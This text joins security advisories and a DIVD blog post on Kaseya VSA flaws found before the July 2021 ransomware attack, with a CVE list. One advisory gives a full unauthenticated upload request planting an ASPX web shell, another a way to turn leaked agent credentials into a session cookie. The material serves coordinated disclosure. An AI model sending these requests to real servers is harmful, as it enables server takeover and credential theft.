## Description

An attacker can upload files with the privilege of the Web Server process for Kaseya VSA Unified Remote Monitoring & Management (RMM) 9.5.4.2149 and subsequently use these files to execute asp commands The api /SystemTab/uploader.aspx is vulnerable to an unauthenticated arbitrary file upload leading to RCE. An attacker can upload files with the privilege of the Web Server process and subsequently use these files to execute asp commands. Detailed description â Given the following request: `POST /SystemTab/uploader.aspx?Filename=shellz.aspx&PathData=C%3A%5CKaseya%5CWebPages%5C&__RequestValidationToken=ac1906a5-d511-47e3-8500-47cc4b0ec219&qqfile=shellz.aspx HTTP/1.1 Host: 192.168.1.194 Cookie: sessionId=92812726; %5F%5FRequestValidationToken=ac1906a5%2Dd511%2D47e3%2D8500%2D47cc4b0ec219 Content-Length: 12 <%@ Page Language="C#" Debug="true" validateRequest="false" %> <%@ Import namespace="System.Web.UI.WebControls" %> <%@ Import namespace="System.Diagnostics" %> <%@ Import namespace="System.IO" %> <%@ Import namespace="System" %> <%@ Import namespace="System.Data" %> <%@ Import namespace="System.Data.SqlClient" %> <%@ Import namespace="System.Security.AccessControl" %> <%@ Import namespace="System.Security.Principal" %> <%@ Import namespace="System.Collections.Generic" %> <%@ Import namespace="System.Collections" %> <script runat="server"> private const string password = "pass"; // The password ( pass ) private const string style = "dark"; // The style ( light / dark ) protected void Page_Load(object sender, EventArgs e) { //this.Remote(password); this.Login(password); this.Style(); this.ServerInfo(); <snip>` The attacker can control the name of the file written via the qqfile parameter and the location of the file written via the PathData parameter. Even though the call requires that a sessionId cookie is passed we have determined that the sessionId is not actually validated and any numeric value is accepted as valid. Security issues discovered â \* a sessionId cookie is required by /SystemTab/uploader.aspx, but is not actually validated, allowing an attacker to bypass authentication \* /SystemTab/uploader.aspx allows an attacker to create a file with arbitrary content in any place the webserver has write access \* The web server process has write access to the webroot where the attacker can execute it by requesting the URL of the newly created file. Impact â This arbitrary file upload allows an attacker to place files of his own choosing on any location on the hard drive of the server the webserver process has access to, including (but not limited to) the webroot. If the attacker uploads files with code to the webroot (e.g. aspx code) he can then execute this code in the context of the webserver to breach either the integrity, confidentiality, or availability of the system or to steal credentials of other users. In other words, this can lead to a full system compromise.

## Solution(s)

SaaS version has been fixed by the vendor.
Upgrade on-premise to version 9.5.6 or above

# Kaseya VSA Limited Disclosure

07 Jul 2021 -
[Frank Breedijk](https://www.divd.nl/who-we-are/team/people/frank-breedijk/)

## Why we are only disclosing limited details on the Kaseya vulnerabilities

Last weekend we found ourselves in the middle of a storm. A storm created by the ransomware attacks executed via Kaseya VSA, using a vulnerability which we confidentially disclosed to Kaseya, together with six other vulnerabilities.

Ever since we released the news that we indeed notified Kaseya of a vulnerability used in the ransomware attack, we have been getting requests to release details about these vulnerabilities and the disclosure timeline. In line with the guidelines for [Coordinated Vulnerability Disclosure](https://english.ncsc.nl/publications/publications/2019/juni/01/coordinated-vulnerability-disclosure-the-guideline) we have not disclosed any details so far. And, while we feel it is time to be more open about this process and our decisions regarding this matter, we will still not release the full details.

## Why the secrecy?

As the ransomware attack using Kaseya VSA software has shown, the effects of a malicious actor knowing the full details of a vulnerability can be devastating. This immediately poses a dilemma to anybody that discovers a critical vulnerability in a critical piece of software, do we disclose the details or not?

Letâs use an analogy. Say a security researcher discovers a vulnerability in a high-end car. When you kick the left rear bumper in just the right way, the car doors open, and the engine starts. What should the researcher do? Tell everybody, tell all the owners of this type of car, or inform the manufacturer so he can recall and fix the car?

If the full details are made public, it is evident that many cars will get stolen very soon. If you inform the owners, this will likely happen too. The chances of the details remaining secret are slim if you inform a broad audience. Even if you limit the details to âa security issue involving the bumperâ, you might tip off the wrong people. Telling the manufacturer there is a good chance that he comes up with a fix before large-scale car thefts are happening, and consider if you need to tell the owners to keep their car behind closed doors in the meantime.

## How does this relate to Kaseya VSA?

When we discovered the vulnerabilities in early April, it was evident to us that we could not let these vulnerabilities fall into the wrong hands. After some deliberation, we decided that informing the vendor and awaiting the delivery of a patch was the right thing to do. We hypothesized that, in the wrong hands, these vulnerabilities could lead to the compromise of large numbers of computers managed by Kaseya VSA.

As we stated before, Kaseyaâs response to our disclosure has been on point and timely; unlike other vendors, we have previously disclosed vulnerabilities to. They listened to our findings, and addressed some of them by releasing a [patch](https://helpdesk.kaseya.com/hc/en-gb/articles/360019054377-9-5-5-Feature-Release-10-April-2021) resolving a number of these vulnerabilities. Followed by a [second patch](https://helpdesk.kaseya.com/hc/en-gb/articles/360019966738-9-5-6-Feature-Release-8-May-2021) resolving even more. Weâve been in contact with Kaseya ahead of the release of both these patches, allowing us to validate that these vulnerabilities had indeed been resolved by the patch in development.

Unfortunately, the worst-case scenario came true on Friday the 2nd of July. Kaseya VSA was used in an attack to spread ransomware, and Kaseya was compelled to use the nuclear option: shutting down their Kaseya Cloud and advising customers to turn off their on-premise Kaseya VSA servers. A message that unfortunately arrived too late for some of their customers.

We later learned that one of the two vulnerabilities used in the attack was one we previously disclosed to Kasya VSA.

## What can we tell?

In this blogpost and DIVD case [DIVD-2021-00011](https://csirt.divd.nl/DIVD-2021-00011/) we publish the timeline and limited details of the vulnerabilities we notified Kaseya of.

## Full disclosure?

Given the serious nature of these vulnerabilities and the obvious consequences of abuse of Kaseya VSA we will not disclose the full details of the vulnerabilities until such time that Kaseya has released a patch and this patch has been installed on a sufficient number of systems, something for which we have the monitoring scripts. In the past few days we have been working with Kaseya to make sure customers turn off their systems, by tipping them off about customers that still have systems online, and hope to be able to continue to work together to ensure that their patch is installed everywhere. We have no indication that Kaseya is hesitant to release a patch. Instead they are still working hard to make sure that after their patch the system is as secure as possible, to avoid a repeat of this scenario. Therefore we do not feel the need to lay down any kind of deadline for full disclosure at this point in time. A properly patched and secure Kaseya VSA is in the best interest of security of Kaseya customers and the internet at large.

## The vulnerabilities

We notified Kaseya of the following vulnerabilities:

* [CVE-2021-30116](https://csirt.divd.nl/cves/CVE-2021-30116) - A credentials leak and business logic flaw, resolution in progress.
* [CVE-2021-30117](https://csirt.divd.nl/cves/CVE-2021-30117) - An SQL injection vulnerability, resolved in May 8th patch.
* [CVE-2021-30118](https://csirt.divd.nl/cves/CVE-2021-30118) - A Remote Code Execution vulnerability, resolved in April 10th patch. (v9.5.6)
* [CVE-2021-30119](https://csirt.divd.nl/cves/CVE-2021-30119) - A Cross Site Scripting vulnerability, resolution in progress.
* [CVE-2021-30120](https://csirt.divd.nl/cves/CVE-2021-30120) - 2FA bypass, resolution in progress.
* [CVE-2021-30121](https://csirt.divd.nl/cves/CVE-2021-30121) - A Local File Inclusion vulnerability, resolved in May 8th patch.
* [CVE-2021-30201](https://csirt.divd.nl/cves/CVE-2021-30201) - A XML External Entity vulnerability, resolved in May 8th patch.

## Description

Kaseya VSA before 9.5.7 allows credential disclosure, as exploited in the wild in July 2021. By default Kaseya VSA on premise offers a download page where the clients for the installation can be downloaded. The default URL for this page is https://x.x.x.x/dl.asp When an attacker download a client for Windows and installs it, the file KaseyaD.ini is generated (C:\Program Files (x86)\Kaseya\XXXXXXXXXX\KaseyaD.ini) which contains an Agent\_Guid and AgentPassword This Agent\_Guid and AgentPassword can be used to log in on dl.asp (https://x.x.x.x/dl.asp?un=840997037507813&pw=113cc622839a4077a84837485ced6b93e440bf66d44057713cb2f95e503a06d9) This request authenticates the client and returns a sessionId cookie that can be used in subsequent attacks to bypass authentication. Security issues discovered â \* Unauthenticated download page leaks credentials \* Credentials of agent software can be used to obtain a sessionId (cookie) that can be used for services not intended for use by agents \* dl.asp accepts credentials via a GET request \* Access to KaseyaD.ini gives an attacker access to sufficient information to penetrate the Kaseya installation and its clients. Impact â Via the page /dl.asp enough information can be obtained to give an attacker a sessionId that can be used to execute further (semi-authenticated) attacks against the system.

## Solution(s)

Upgrade to a version after 9.5.6
